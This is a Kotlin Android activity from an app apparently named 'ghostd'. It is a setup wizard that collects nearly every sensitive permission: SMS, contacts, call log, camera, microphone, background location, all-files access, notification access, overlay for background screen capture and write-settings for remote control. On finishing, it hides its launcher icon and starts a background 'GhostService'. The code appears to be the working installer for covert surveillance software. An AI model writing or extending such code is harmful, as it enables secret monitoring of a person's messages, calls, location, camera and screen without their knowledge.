package com.tg.ghostd

import android.Manifest
import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.view.Gravity
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView

/**
 * Setup wizard: walks through every permission the manifest declares.
 * Each row shows live state and has a button to request it. "Finish"
 * is enabled only when everything is granted; it hides the launcher icon,
 * marks setup done (boot receiver gate) and starts GhostService.
 */
class MainActivity : Activity() {

    private class Row(
        val title: String,
        val check: () -> Boolean,
        val request: () -> Unit,
        var status: TextView? = null,
        var button: Button? = null
    )

    private val rows = ArrayList<Row>()
    private lateinit var rowsLayout: LinearLayout
    private lateinit var finishBtn: Button
    private lateinit var header: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val scroll = ScrollView(this)
        rowsLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(48, 64, 48, 64)
        }
        scroll.addView(rowsLayout)

        header = TextView(this).apply {
            textSize = 18f
            setPadding(0, 0, 0, 32)
        }
        rowsLayout.addView(header)

        if (Prefs.setupDone(this)) {
            header.text = "Setup complete"
            setContentView(scroll)
            return
        }

        header.text = "Service setup"

        // ---- runtime permissions (one row each) ----
        runtimeRow("SMS (read)", Manifest.permission.READ_SMS)
        runtimeRow("SMS (receive)", Manifest.permission.RECEIVE_SMS)
        runtimeRow("Contacts", Manifest.permission.READ_CONTACTS)
        runtimeRow("Call log", Manifest.permission.READ_CALL_LOG)
        runtimeRow("Camera", Manifest.permission.CAMERA)
        runtimeRow("Microphone", Manifest.permission.RECORD_AUDIO)
        runtimeRow("Media — images", Manifest.permission.READ_MEDIA_IMAGES)
        runtimeRow("Media — video", Manifest.permission.READ_MEDIA_VIDEO)
        runtimeRow("Media — audio", Manifest.permission.READ_MEDIA_AUDIO)
        runtimeRow("Location (precise)", Manifest.permission.ACCESS_FINE_LOCATION)

        // background location must be requested after fine location
        rows += row(
            "Location (background)",
            check = { granted(Manifest.permission.ACCESS_BACKGROUND_LOCATION) },
            request = {
                if (granted(Manifest.permission.ACCESS_FINE_LOCATION)) {
                    requestPermissions(arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION), 1)
                } else {
                    requestPermissions(arrayOf(Manifest.permission.ACCESS_FINE_LOCATION), 1)
                }
            }
        )

        runtimeRow("Notifications", Manifest.permission.POST_NOTIFICATIONS)

        // ---- special permissions (Settings screens) ----
        rows += row(
            "All files access",
            check = { Environment.isExternalStorageManager() },
            request = {
                startActivity(
                    Intent(
                        Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION,
                        Uri.parse("package:$packageName")
                    )
                )
            }
        )
        rows += row(
            "Notification access",
            check = { notificationAccessGranted() },
            request = { startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) }
        )
        rows += row(
            "Battery optimization exemption",
            check = {
                getSystemService(android.os.PowerManager::class.java)
                    .isIgnoringBatteryOptimizations(packageName)
            },
            request = {
                startActivity(
                    Intent(
                        Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                        Uri.parse("package:$packageName")
                    )
                )
            }
        )

        // needed for remote brightness set
        rows += row(
            "Modify system settings (brightness)",
            check = { Settings.System.canWrite(this) },
            request = {
                startActivity(
                    Intent(
                        Settings.ACTION_MANAGE_WRITE_SETTINGS,
                        Uri.parse("package:$packageName")
                    )
                )
            }
        )

        // needed so the service can pop the screen-capture consent dialog
        // from the background (Android 10+ background-activity-start rules)
        rows += row(
            "Draw over other apps (screen capture)",
            check = { Settings.canDrawOverlays(this) },
            request = {
                startActivity(
                    Intent(
                        Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:$packageName")
                    )
                )
            }
        )

        // ---- finish ----
        finishBtn = Button(this).apply {
            text = "Finish"
            setOnClickListener { finishSetup() }
        }
        rowsLayout.addView(
            finishBtn,
            LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { topMargin = 48 }
        )

        setContentView(scroll)
        refresh()
    }

    // ------------------------------------------------------------------ rows

    private fun runtimeRow(title: String, perm: String) {
        rows += row(
            title,
            check = { granted(perm) },
            request = { requestPermissions(arrayOf(perm), 1) }
        )
    }

    private fun row(title: String, check: () -> Boolean, request: () -> Unit): Row {
        val r = Row(title, check, request)
        val line = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            setPadding(0, 16, 0, 16)
        }
        val label = TextView(this).apply {
            this.text = title
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
        }
        val status = TextView(this).apply { setPadding(24, 0, 24, 0) }
        val btn = Button(this).apply {
            text = "Allow"
            setOnClickListener { r.request() }
        }
        line.addView(label)
        line.addView(status)
        line.addView(btn)
        rowsLayout.addView(
            line,
            LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        )
        r.status = status
        r.button = btn
        return r
    }

    // ------------------------------------------------------------------ state

    private fun granted(perm: String): Boolean =
        checkSelfPermission(perm) == PackageManager.PERMISSION_GRANTED

    private fun notificationAccessGranted(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners") ?: ""
        return flat.split(':').any { it == packageName }
    }

    private fun refresh() {
        var all = true
        for (r in rows) {
            val ok = r.check()
            if (!ok) all = false
            r.status?.text = if (ok) "✓" else "…"
            r.button?.visibility = if (ok) Button.GONE else Button.VISIBLE
        }
        finishBtn.isEnabled = all
        finishBtn.alpha = if (all) 1f else 0.4f
    }

    override fun onResume() {
        super.onResume()
        if (::finishBtn.isInitialized) refresh()
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        refresh()
    }

    // ------------------------------------------------------------------ done

    private fun finishSetup() {
        Prefs.setSetupDone(this)
        // Hide launcher icon (activity-alias holds the MAIN/LAUNCHER filter).
        packageManager.setComponentEnabledSetting(
            ComponentName(this, "$packageName.MainAlias"),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        startForegroundService(Intent(this, GhostService::class.java))
        for (r in rows) {
            r.button?.visibility = Button.GONE
        }
        finishBtn.isEnabled = false
        finishBtn.alpha = 0.4f
        header.text = "Setup complete"
    }
}
